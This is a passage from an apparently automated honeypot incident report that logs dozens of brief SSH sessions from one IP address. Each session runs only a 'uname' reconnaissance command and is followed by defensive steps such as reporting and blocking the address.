| `2026-08-15 06:58:08` | `cowrie.login.success` |
| `2026-08-15 06:58:09` | `cowrie.session.params` |
| `2026-08-15 06:58:09` | `cowrie.command.input` |
| `2026-08-15 06:58:09` | `cowrie.log.closed` |
| `2026-08-15 06:58:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93229dc8a1ba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:58 |
| **Last Seen** | 2026-08-15 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:58:13` | `cowrie.session.connect` |
| `2026-08-15 06:58:13` | `cowrie.client.version` |
| `2026-08-15 06:58:13` | `cowrie.client.kex` |
| `2026-08-15 06:58:13` | `cowrie.login.success` |
| `2026-08-15 06:58:14` | `cowrie.session.params` |
| `2026-08-15 06:58:14` | `cowrie.command.input` |
| `2026-08-15 06:58:14` | `cowrie.log.closed` |
| `2026-08-15 06:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed93e6120f8e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:58 |
| **Last Seen** | 2026-08-15 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:58:19` | `cowrie.session.connect` |
| `2026-08-15 06:58:19` | `cowrie.client.version` |
| `2026-08-15 06:58:19` | `cowrie.client.kex` |
| `2026-08-15 06:58:20` | `cowrie.login.success` |
| `2026-08-15 06:58:21` | `cowrie.session.params` |
| `2026-08-15 06:58:21` | `cowrie.command.input` |
| `2026-08-15 06:58:21` | `cowrie.log.closed` |
| `2026-08-15 06:58:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06fd3579d0aa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:58 |
| **Last Seen** | 2026-08-15 06:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:58:25` | `cowrie.session.connect` |
| `2026-08-15 06:58:25` | `cowrie.client.version` |
| `2026-08-15 06:58:25` | `cowrie.client.kex` |
| `2026-08-15 06:58:26` | `cowrie.login.success` |
| `2026-08-15 06:58:27` | `cowrie.session.params` |
| `2026-08-15 06:58:27` | `cowrie.command.input` |
| `2026-08-15 06:58:28` | `cowrie.log.closed` |
| `2026-08-15 06:58:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a6b1c8b56e9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:58 |
| **Last Seen** | 2026-08-15 06:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:58:30` | `cowrie.session.connect` |
| `2026-08-15 06:58:31` | `cowrie.client.version` |
| `2026-08-15 06:58:31` | `cowrie.client.kex` |
| `2026-08-15 06:58:32` | `cowrie.login.success` |
| `2026-08-15 06:58:33` | `cowrie.session.params` |
| `2026-08-15 06:58:33` | `cowrie.command.input` |
| `2026-08-15 06:58:33` | `cowrie.log.closed` |
| `2026-08-15 06:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a28a78e292b9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:58 |
| **Last Seen** | 2026-08-15 06:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:58:37` | `cowrie.session.connect` |
| `2026-08-15 06:58:37` | `cowrie.client.version` |
| `2026-08-15 06:58:37` | `cowrie.client.kex` |
| `2026-08-15 06:58:38` | `cowrie.login.success` |
| `2026-08-15 06:58:38` | `cowrie.session.params` |
| `2026-08-15 06:58:38` | `cowrie.command.input` |
| `2026-08-15 06:58:39` | `cowrie.log.closed` |
| `2026-08-15 06:58:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d903d9c191ae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:58 |
| **Last Seen** | 2026-08-15 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:58:42` | `cowrie.session.connect` |
| `2026-08-15 06:58:42` | `cowrie.client.version` |
| `2026-08-15 06:58:42` | `cowrie.client.kex` |
| `2026-08-15 06:58:43` | `cowrie.login.success` |
| `2026-08-15 06:58:44` | `cowrie.session.params` |
| `2026-08-15 06:58:44` | `cowrie.command.input` |
| `2026-08-15 06:58:44` | `cowrie.log.closed` |
| `2026-08-15 06:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2bb19c485a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:58 |
| **Last Seen** | 2026-08-15 06:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:58:48` | `cowrie.session.connect` |
| `2026-08-15 06:58:49` | `cowrie.client.version` |
| `2026-08-15 06:58:49` | `cowrie.client.kex` |
| `2026-08-15 06:58:50` | `cowrie.login.success` |
| `2026-08-15 06:58:51` | `cowrie.session.params` |
| `2026-08-15 06:58:51` | `cowrie.command.input` |
| `2026-08-15 06:58:51` | `cowrie.log.closed` |
| `2026-08-15 06:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-866d790e2187

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:58 |
| **Last Seen** | 2026-08-15 06:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:58:54` | `cowrie.session.connect` |
| `2026-08-15 06:58:54` | `cowrie.client.version` |
| `2026-08-15 06:58:54` | `cowrie.client.kex` |
| `2026-08-15 06:58:56` | `cowrie.login.success` |
| `2026-08-15 06:58:57` | `cowrie.session.params` |
| `2026-08-15 06:58:57` | `cowrie.command.input` |
| `2026-08-15 06:58:57` | `cowrie.log.closed` |
| `2026-08-15 06:58:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bc6a38d3e53

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:59 |
| **Last Seen** | 2026-08-15 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:59:00` | `cowrie.session.connect` |
| `2026-08-15 06:59:00` | `cowrie.client.version` |
| `2026-08-15 06:59:00` | `cowrie.client.kex` |
| `2026-08-15 06:59:02` | `cowrie.login.success` |
| `2026-08-15 06:59:03` | `cowrie.session.params` |
| `2026-08-15 06:59:03` | `cowrie.command.input` |
| `2026-08-15 06:59:03` | `cowrie.log.closed` |
| `2026-08-15 06:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d02c8e06777

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:59 |
| **Last Seen** | 2026-08-15 06:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:59:07` | `cowrie.session.connect` |
| `2026-08-15 06:59:07` | `cowrie.client.version` |
| `2026-08-15 06:59:07` | `cowrie.client.kex` |
| `2026-08-15 06:59:09` | `cowrie.login.success` |
| `2026-08-15 06:59:10` | `cowrie.session.params` |
| `2026-08-15 06:59:10` | `cowrie.command.input` |
| `2026-08-15 06:59:10` | `cowrie.log.closed` |
| `2026-08-15 06:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df6e7c367d0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:59 |
| **Last Seen** | 2026-08-15 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:59:13` | `cowrie.session.connect` |
| `2026-08-15 06:59:13` | `cowrie.client.version` |
| `2026-08-15 06:59:13` | `cowrie.client.kex` |
| `2026-08-15 06:59:14` | `cowrie.login.success` |
| `2026-08-15 06:59:15` | `cowrie.session.params` |
| `2026-08-15 06:59:15` | `cowrie.command.input` |
| `2026-08-15 06:59:15` | `cowrie.log.closed` |
| `2026-08-15 06:59:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e0cd18cd8ea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:59 |
| **Last Seen** | 2026-08-15 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:59:18` | `cowrie.session.connect` |
| `2026-08-15 06:59:18` | `cowrie.client.version` |
| `2026-08-15 06:59:18` | `cowrie.client.kex` |
| `2026-08-15 06:59:20` | `cowrie.login.success` |
| `2026-08-15 06:59:21` | `cowrie.session.params` |
| `2026-08-15 06:59:21` | `cowrie.command.input` |
| `2026-08-15 06:59:21` | `cowrie.log.closed` |
| `2026-08-15 06:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20cc4b763e12

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:59 |
| **Last Seen** | 2026-08-15 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:59:24` | `cowrie.session.connect` |
| `2026-08-15 06:59:25` | `cowrie.client.version` |
| `2026-08-15 06:59:25` | `cowrie.client.kex` |
| `2026-08-15 06:59:25` | `cowrie.login.success` |
| `2026-08-15 06:59:27` | `cowrie.session.params` |
| `2026-08-15 06:59:27` | `cowrie.command.input` |
| `2026-08-15 06:59:27` | `cowrie.log.closed` |
| `2026-08-15 06:59:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ebb30122f70

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:59 |
| **Last Seen** | 2026-08-15 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:59:30` | `cowrie.session.connect` |
| `2026-08-15 06:59:30` | `cowrie.client.version` |
| `2026-08-15 06:59:30` | `cowrie.client.kex` |
| `2026-08-15 06:59:31` | `cowrie.login.success` |
| `2026-08-15 06:59:32` | `cowrie.session.params` |
| `2026-08-15 06:59:32` | `cowrie.command.input` |
| `2026-08-15 06:59:32` | `cowrie.log.closed` |
| `2026-08-15 06:59:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1d45a2a3e79

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:59 |
| **Last Seen** | 2026-08-15 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:59:36` | `cowrie.session.connect` |
| `2026-08-15 06:59:36` | `cowrie.client.version` |
| `2026-08-15 06:59:36` | `cowrie.client.kex` |
| `2026-08-15 06:59:37` | `cowrie.login.success` |
| `2026-08-15 06:59:38` | `cowrie.session.params` |
| `2026-08-15 06:59:38` | `cowrie.command.input` |
| `2026-08-15 06:59:39` | `cowrie.log.closed` |
| `2026-08-15 06:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-354d1f34d9a6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:59 |
| **Last Seen** | 2026-08-15 06:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:59:41` | `cowrie.session.connect` |
| `2026-08-15 06:59:42` | `cowrie.client.version` |
| `2026-08-15 06:59:42` | `cowrie.client.kex` |
| `2026-08-15 06:59:43` | `cowrie.login.success` |
| `2026-08-15 06:59:44` | `cowrie.session.params` |
| `2026-08-15 06:59:44` | `cowrie.command.input` |
| `2026-08-15 06:59:44` | `cowrie.log.closed` |
| `2026-08-15 06:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-412ff4bf8ace

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:59 |
| **Last Seen** | 2026-08-15 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:59:47` | `cowrie.session.connect` |
| `2026-08-15 06:59:47` | `cowrie.client.version` |
| `2026-08-15 06:59:47` | `cowrie.client.kex` |
| `2026-08-15 06:59:49` | `cowrie.login.success` |
| `2026-08-15 06:59:50` | `cowrie.session.params` |
| `2026-08-15 06:59:50` | `cowrie.command.input` |
| `2026-08-15 06:59:50` | `cowrie.log.closed` |
| `2026-08-15 06:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b24eb20d4eee

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:59 |
| **Last Seen** | 2026-08-15 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:59:53` | `cowrie.session.connect` |
| `2026-08-15 06:59:53` | `cowrie.client.version` |
| `2026-08-15 06:59:53` | `cowrie.client.kex` |
| `2026-08-15 06:59:55` | `cowrie.login.success` |
| `2026-08-15 06:59:56` | `cowrie.session.params` |
| `2026-08-15 06:59:56` | `cowrie.command.input` |
| `2026-08-15 06:59:56` | `cowrie.log.closed` |
| `2026-08-15 06:59:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-817a5cf5bd20

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:59 |
| **Last Seen** | 2026-08-15 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:59:59` | `cowrie.session.connect` |
| `2026-08-15 06:59:59` | `cowrie.client.version` |
| `2026-08-15 06:59:59` | `cowrie.client.kex` |
| `2026-08-15 07:00:00` | `cowrie.login.success` |
| `2026-08-15 07:00:01` | `cowrie.session.params` |
| `2026-08-15 07:00:01` | `cowrie.command.input` |
| `2026-08-15 07:00:01` | `cowrie.log.closed` |
| `2026-08-15 07:00:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5529720b596

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:00 |
| **Last Seen** | 2026-08-15 07:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:00:05` | `cowrie.session.connect` |
| `2026-08-15 07:00:05` | `cowrie.client.version` |
| `2026-08-15 07:00:05` | `cowrie.client.kex` |
| `2026-08-15 07:00:06` | `cowrie.login.success` |
| `2026-08-15 07:00:08` | `cowrie.session.params` |
| `2026-08-15 07:00:08` | `cowrie.command.input` |
| `2026-08-15 07:00:08` | `cowrie.log.closed` |
| `2026-08-15 07:00:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-584851ec127c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:00 |
| **Last Seen** | 2026-08-15 07:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:00:11` | `cowrie.session.connect` |
| `2026-08-15 07:00:12` | `cowrie.client.version` |
| `2026-08-15 07:00:12` | `cowrie.client.kex` |
| `2026-08-15 07:00:12` | `cowrie.login.success` |
| `2026-08-15 07:00:13` | `cowrie.session.params` |
| `2026-08-15 07:00:13` | `cowrie.command.input` |
| `2026-08-15 07:00:13` | `cowrie.log.closed` |
| `2026-08-15 07:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-966410d6d46a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:00 |
| **Last Seen** | 2026-08-15 07:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:00:18` | `cowrie.session.connect` |
| `2026-08-15 07:00:18` | `cowrie.client.version` |
| `2026-08-15 07:00:18` | `cowrie.client.kex` |
| `2026-08-15 07:00:19` | `cowrie.login.success` |
| `2026-08-15 07:00:20` | `cowrie.session.params` |
| `2026-08-15 07:00:20` | `cowrie.command.input` |
| `2026-08-15 07:00:20` | `cowrie.log.closed` |
| `2026-08-15 07:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b4a15fe42c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:00 |
| **Last Seen** | 2026-08-15 07:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:00:24` | `cowrie.session.connect` |
| `2026-08-15 07:00:24` | `cowrie.client.version` |
| `2026-08-15 07:00:24` | `cowrie.client.kex` |
| `2026-08-15 07:00:26` | `cowrie.login.success` |
| `2026-08-15 07:00:27` | `cowrie.session.params` |
| `2026-08-15 07:00:27` | `cowrie.command.input` |
| `2026-08-15 07:00:27` | `cowrie.log.closed` |
| `2026-08-15 07:00:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-405f53e3f928

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:00 |
| **Last Seen** | 2026-08-15 07:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:00:31` | `cowrie.session.connect` |
| `2026-08-15 07:00:31` | `cowrie.client.version` |
| `2026-08-15 07:00:31` | `cowrie.client.kex` |
| `2026-08-15 07:00:31` | `cowrie.login.success` |
| `2026-08-15 07:00:32` | `cowrie.session.params` |
| `2026-08-15 07:00:32` | `cowrie.command.input` |
| `2026-08-15 07:00:33` | `cowrie.log.closed` |
| `2026-08-15 07:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-208e87e0dc11

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:00 |
| **Last Seen** | 2026-08-15 07:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:00:36` | `cowrie.session.connect` |
| `2026-08-15 07:00:36` | `cowrie.client.version` |
| `2026-08-15 07:00:36` | `cowrie.client.kex` |
| `2026-08-15 07:00:38` | `cowrie.login.success` |
| `2026-08-15 07:00:39` | `cowrie.session.params` |
| `2026-08-15 07:00:39` | `cowrie.command.input` |
| `2026-08-15 07:00:39` | `cowrie.log.closed` |
| `2026-08-15 07:00:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebcb7170ff4b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:00 |
| **Last Seen** | 2026-08-15 07:00 |
| **Session Duration** | 1s |
